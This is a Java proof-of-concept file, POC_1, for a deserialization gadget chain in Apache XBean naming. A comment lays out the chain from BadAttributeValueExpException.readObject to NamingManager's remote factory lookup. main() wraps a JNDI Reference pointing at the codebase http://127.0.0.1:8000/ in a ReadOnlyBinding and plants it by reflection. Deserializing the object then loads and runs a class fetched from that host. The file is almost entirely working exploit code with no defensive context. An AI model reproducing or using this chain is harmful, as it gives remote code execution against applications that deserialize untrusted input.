package com.example.XBean;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;

import javax.management.BadAttributeValueExpException;
import javax.naming.Context;
import javax.naming.Reference;

public class POC_1 {

    /***
     * <javax.management.BadAttributeValueExpException: void readObject(java.io.ObjectInputStream)>
     * <org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding: java.lang.String toString()>
     * <org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding: java.lang.Object getObject()>
     * <org.apache.xbean.naming.context.ContextUtil: java.lang.Object resolve(java.lang.Object,java.lang.String,javax.naming.Name,javax.naming.Context)>
     * <javax.naming.spi.NamingManager: java.lang.Object getObjectInstance(java.lang.Object,javax.naming.Name,javax.naming.Context,java.util.Hashtable)>
     * <javax.naming.spi.NamingManager: javax.naming.spi.ObjectFactory getObjectFactoryFromReference(javax.naming.Reference,java.lang.String)>
     */

    public static void main(String[] args) throws Exception {
        Context ctx = ReflectionUtil.createWithoutConstructor(WritableContext.class);
        Reference refObj = new Reference("xxx","xxx","http://127.0.0.1:8000/");
        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("x", refObj, ctx);
        BadAttributeValueExpException bad = new BadAttributeValueExpException("1");

        ReflectionUtil.setField(bad, "val", binding);
        SerializeUtil.deserialize(SerializeUtil.serialize(bad));
    }

}
